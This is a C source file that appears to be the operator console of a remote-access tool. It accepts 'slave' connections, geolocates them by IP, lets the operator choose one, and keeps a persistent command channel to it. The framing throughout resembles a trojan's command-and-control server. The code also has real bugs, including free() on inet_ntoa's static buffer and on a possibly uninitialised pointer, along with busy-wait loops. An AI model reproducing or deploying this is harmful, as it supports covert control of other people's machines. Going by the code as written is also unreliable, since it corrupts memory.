#include <stdio.h>
#include <windows.h>
#include "server.h"
#include "whitelist.h"
#include "blocklist.h"
#include "logger.h"
#include "types.h"
#include "SCL2.h"
#include "input.h"
#include "net/dns.h"
#include "net/error.h"
#include "net/interface.h"
#include "geoIP.h"
#include "server/serv_cmds.h"
#include "server/hdd/hdd.h"

int server_isSendingCmd = 0;
int server_keepAliveRunning = 0;
int server_isSendingKeepAlive = 0;
int server_timeout = 1000;
int server_Running = 0;
int server_UsingPort = SERVER_DEF_PORT;
ulong server_io_block = 0;
ulong server_io_nonBlock = 1;
SOCKET server_socket = INVALID_SOCKET;
SOCKADDR_IN server_socketAddr;

SOCKET server_Client = INVALID_SOCKET;
SOCKADDR_IN server_ClientAddr;

int server_clientListSize = 0;
SOCKET server_clientList[SERVER_MAX_CLIENTS];
SOCKADDR_IN server_clientAddrList[SERVER_MAX_CLIENTS];

void server_closeAllUnused(void)
{
	int id;

	for(id = 0; id != SERVER_MAX_CLIENTS; id++)
	{
		if(server_Client == server_clientList[id])
		{
			continue;
		}
		
		if(server_clientList[id] != INVALID_SOCKET)
		{
			shutdown(server_clientList[id], SD_BOTH);
			closesocket(server_clientList[id]);
			server_clientList[id] = INVALID_SOCKET;
		}
	}
}

void server_CloseConnection(void)
{
	int id;
	
	for(id = 0; id != SERVER_MAX_CLIENTS; id++)
	{
		if(server_clientList[id] != INVALID_SOCKET)
		{
			shutdown(server_clientList[id], SD_BOTH);
			closesocket(server_clientList[id]);
			server_clientList[id] = INVALID_SOCKET;
		}
	}

	if(server_Running != 0 && server_Client != INVALID_SOCKET)
	{
		shutdown(server_Client, SD_BOTH);
		closesocket(server_Client);
		server_Client = INVALID_SOCKET;
	}

	if(!server_socket)
	{
		return;
	}

	shutdown(server_socket, SD_BOTH);
	closesocket(server_socket);
	server_socket = INVALID_SOCKET;
	server_Running = 0;
}


int server_WsaInit(void)
{
	WSADATA wsaData;
	
	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return SERVER_ERROR_WSASTARTUP;
	}

	return SERVER_NO_ERROR;
}

void server_Cleanup(void)
{
	server_CloseConnection();

	WSACleanup();
}

int server_Create(void)
{
	server_socket = socket(AF_INET, SOCK_STREAM, 0);

	int _val1 = 1;

	setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR,(char*)&_val1, sizeof(_val1));
	setsockopt(server_socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&server_timeout, sizeof(server_timeout));
	setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, (char*)&_val1, sizeof(_val1));
	net_SetBuffer(NET_BUFFSIZE);

	server_socketAddr.sin_addr.s_addr = INADDR_ANY;
	server_socketAddr.sin_family = AF_INET;
	server_socketAddr.sin_port = htons(server_UsingPort);

	if(bind(server_socket, (SOCKADDR*)&server_socketAddr, sizeof(server_socketAddr)) != 0)
	{
		WSACleanup();

		return SERVER_ERROR_BIND;
	}

	int i;
	
	for(i = 0; i != SERVER_MAX_CLIENTS; i++)
	{
		server_clientList[i] = INVALID_SOCKET;
	}

	server_clientListSize = 0;
	server_Client = INVALID_SOCKET;

	return SERVER_NO_ERROR;
}

int server_WaitForSlaves(void)
{
	if(listen(server_socket, SOMAXCONN) != 0)
	{
		WSACleanup();

		return SERVER_ERROR_LISTEN;
	}

	ioctlsocket(server_socket, FIONBIO, &server_io_nonBlock);

	if(whitelist_IsInUse)
	{
		int _count = whitelist_Count();

		LOG(LOG_INFO, "IPs to allow: %d\n", _count);
	}

	if(blocklist_IsInUse)
	{
		int _count = blocklist_Count();
		
		LOG(LOG_INFO, "IPs to block: %d\n", _count);
	}

	LOG(LOG_INFO, "Waiting for connection on port %d\n", server_UsingPort);
	LOG(LOG_INFO, "Hold \"ESC\" to stop listening!\n");
	LOG(LOG_NONE, "  Num  IP\n");

	net_Ping = 0;
	hdd_Reset();
	int useSlaveID = -1;
	LOG_TitleMaster();

	while(1)
	{
		SOCKET server_TempClient;
		SOCKADDR_IN server_TempClientAddr;

		int _addrsize = sizeof(server_TempClientAddr);

		while((server_TempClient = accept(server_socket, (SOCKADDR*)&server_TempClientAddr, &_addrsize)) == INVALID_SOCKET)
		{
			Sleep(500);

			if(input_IsKeyPressed(VK_ESCAPE))
			{
				while(1)
				{
					if(server_clientListSize < 1)
					{
						ioctlsocket(server_socket, FIONBIO, &server_io_block);
						server_CloseConnection();

						return SERVER_ERROR_NO_SLAVE;
					}

					LOG(LOG_INFO, "Chose slave ID from 1 to %d (0 to stop):", server_clientListSize);

					char* cmdTodo;
					
					int tig = input_Get(INPUT_TYPE_NONE, &cmdTodo);

					if(tig)
					{
						useSlaveID = atoi(cmdTodo);
						
						free(cmdTodo);
					}else{
						useSlaveID = 0;
					}
					
					if(useSlaveID - 1 < 0)
					{
						ioctlsocket(server_socket, FIONBIO, &server_io_block);
						server_CloseConnection();

						return SERVER_ERROR_NO_SLAVE;
					}

					useSlaveID--;

					if(useSlaveID >= 0 && useSlaveID <= server_clientListSize)
					{
						if(server_clientList[useSlaveID] == INVALID_SOCKET)
						{
							LOG(LOG_ERR, "There is empty connection...\n");
						}else{
							char _val1[1] = { 1 };
							server_Client = server_clientList[useSlaveID];
							server_ClientAddr = server_clientAddrList[useSlaveID];
							
							ioctlsocket(server_socket, FIONBIO, &server_io_block);
							ioctlsocket(server_Client, FIONBIO, &server_io_block);
							setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, _val1, sizeof(int));
							setsockopt(server_Client, SOL_SOCKET, SO_RCVTIMEO, (char*)&server_timeout, sizeof(server_timeout));
							//screen_isUsingCompressor = 0;
							
							LOG(LOG_WAR, "Your slave is now %s\n", inet_ntoa(server_ClientAddr.sin_addr));
							SCL2_Reset();

							server_closeAllUnused();

							return SERVER_NO_ERROR;
						}
					}else{
						LOG(LOG_ERR, "Invalid id number!\n");

						continue;
					}

					return SERVER_NO_ERROR;
				}
			}
		}

		if(server_TempClient != INVALID_SOCKET)
		{
			if(whitelist_IsInUse)
			{
				char* cip = inet_ntoa(server_TempClientAddr.sin_addr);
	
				if(whitelist_IsKnown(cip) != WHITELIST_ERROR_HAS)
				{
					free(cip);
					shutdown(server_TempClient, SD_BOTH);
					closesocket(server_TempClient);
	
					continue;
				}
	
				free(cip);
			}
	
			if(blocklist_IsInUse)
			{
				char* cip = inet_ntoa(server_TempClientAddr.sin_addr);
	
				if(blocklist_IsBlocked(cip) == BLOCKLIST_ERROR_HAS)
				{
					free(cip);
					shutdown(server_TempClient, SD_BOTH);
					closesocket(server_TempClient);
	
					continue;
				}
	
				free(cip);
			}

			int sn_rv;
			uint8* slaveName;
			ioctlsocket(server_socket, FIONBIO, &server_io_block);
			ioctlsocket(server_TempClient, FIONBIO, &server_io_block);
			SCL2_Reset();

			server_Client = server_TempClient;

			sn_rv = net_ReceiveDataTimeout(&slaveName, SERVER_SLAVENAME_TIMER);
			
			if(sn_rv > 0)
			{
				LOG(LOG_NONE, "  ");
				LOG_TablePrint(3, "%d", server_clientListSize + 1);
				printf("  %s ", inet_ntoa(server_TempClientAddr.sin_addr));
				
				if(sn_rv == NET_ERROR_TIMEOUT)
				{
					putchar('(');
					LOG_SetColor(LOG_COLOR_ERR);
					printf("UNKNOWN");
					LOG_SetColor(LOG_COLOR_TEXT);
					putchar(')');
				}else{
					printf("(%s)", slaveName);
				}
	
				if(geoIP_IsInUse)
				{
					char* geoName;

					printf(" (");

					if(geoIP_CheckIP(inet_ntoa(server_TempClientAddr.sin_addr), &geoName) != GEOIP_NO_ERROR)
					{
						LOG_SetColor(LOG_COLOR_ERR);
						printf("UNKNOWN");
						LOG_SetColor(LOG_COLOR_TEXT);
						putchar(')');
					}else{
						printf("%s)", geoName);
					}

					free(geoName);
				}

				LOG_NEWLINE();
				server_clientList[server_clientListSize] = server_TempClient;
				server_clientAddrList[server_clientListSize++] = server_TempClientAddr;
				free(slaveName);

				ioctlsocket(server_socket, FIONBIO, &server_io_nonBlock);
				ioctlsocket(server_TempClient, FIONBIO, &server_io_nonBlock);
				server_Client = INVALID_SOCKET;
				
				continue;
			}

			shutdown(server_TempClient, SD_BOTH);
			closesocket(server_TempClient);
		}
	}

	ioctlsocket(server_socket, FIONBIO, &server_io_block);

	return -1;
}

//keep-alive option is just 2 hours... not enough! i think this will keep alive the connection forever. i don't wanna test if it will work
ulong __stdcall server_thread_KeepAlive(void* args)
{
	server_keepAliveRunning = 1;
	server_isSendingKeepAlive = 0;

	Sleep(SERVER_KEEPALIVE_INTERVAL);

	while(server_Running)
	{
		if(!server_Running || !server_keepAliveRunning)
		{
			break;
		}

		server_isSendingKeepAlive = 1;

		while(server_isSendingCmd){};
		
		if(net_CheckConnection() < 1)
		{
			server_keepAliveRunning = 0;
			server_isSendingKeepAlive = 0;
			server_CloseConnection();

			return 0;
		}

		server_isSendingKeepAlive = 0;
		Sleep(SERVER_KEEPALIVE_INTERVAL);
	}

	server_keepAliveRunning = 0;
	server_isSendingKeepAlive = 0;

	return 0;
}

void server_ConnectionHandle(void)
{	
	while(server_keepAliveRunning){}; //wait for keep alive

	int rv = 0;
	char* in_msg;
	server_Running = 1;
	server_isSendingCmd = 0;

	if(!CreateThread(NULL, 0, server_thread_KeepAlive, NULL, 0, NULL))
	{
		LOG(LOG_ERR, "Failed to create reviver!\n");
		LOG(LOG_INFO, "The connection my close if you don't send data\n");
	}

	while(server_Running)
	{
		LOG_NEWLINE();

		if(!input_Get(INPUT_TYPE_MASTER, &in_msg))
		{
			if(!server_Running)
			{
				LOG_NEWLINE();
			}
			continue;
		}

		server_isSendingCmd = 1;
		while(server_isSendingKeepAlive){}; //wait is keepalive is sending
		
		if(net_CheckConnection() < 1)
		{
			LOG_NEWLINE();
			LOG(LOG_WAR, "%s lost connection!\n", inet_ntoa(server_ClientAddr.sin_addr));
			server_CloseConnection();
			free(in_msg);

			break;
		}

		rv = serv_cmds_Translate(in_msg, strlen(in_msg));

		free(in_msg);

		if(rv == SERV_CMDS_BREAK)
		{
			server_CloseConnection();
			
			break;
		}else if(rv == SERV_CMDS_GOOD){
			SCL2_SeedUp();
		}

		server_isSendingCmd = 0;
	}
}